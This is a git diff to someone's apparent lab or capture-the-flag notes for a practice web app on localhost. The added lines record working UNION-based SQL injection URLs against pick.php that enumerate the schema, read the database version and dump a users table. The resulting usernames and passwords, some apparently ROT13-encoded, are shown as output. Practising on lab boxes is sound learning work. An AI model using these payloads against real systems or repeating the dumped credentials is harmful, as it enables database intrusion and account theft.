@@ -1,3 +1,5 @@
+STOP OVERTHINKING SHIT LITERALLY JUST RELAX YOU KNOW HOW TO DO THIS
+
 # PROMPT
 ```
 OPERATION: DRY RUN
@@ -134,10 +136,32 @@ RECON
 	4. Connect to the website via firefox by entering the following . You do this so you can manipulate the php scripts used by the website
 		> firefox <ip_addr:port>
 	
-Get/POST EXPLOITATION
---------------------
+BOX 2 BestWebApp
 
-	1. 
+golden statement	:	http://localhost:11135/pick.php?product=7%20UNION%20select%20table_schema,column_name,table_name%20from%20information_schema.columns
+
+version of sql		:	http://localhost:11135/pick.php?product=7%20UNION%20select%201,2,@@version
+					>	10.1.48-MariaDB-0ubuntu0.18.04.
+					
+					
+
+getting the user info you need		:	http://localhost:11135/pick.php?product=7%20UNION%20select%20user_id,name,username%20from%20siteusers.users
+						
+						
+mf uhh users
+
+Item 	On Hand 	Price
+HAM 	32 	$15
+1 	Aaron 	$Aaron
+2 	user2 	$user2
+3 	user3 	$user3
+4 	Lroth 	$Lee_Roth
+1 	ncnffjbeqlCn$$jbeq 	$Aaron
+2 	RntyrfVfNER78 	$user2
+3 	Obo4GURRnccyrf 	$user3
+4 	anotherpassword4THEages 	$Lroth
+
+
 
 ```
 
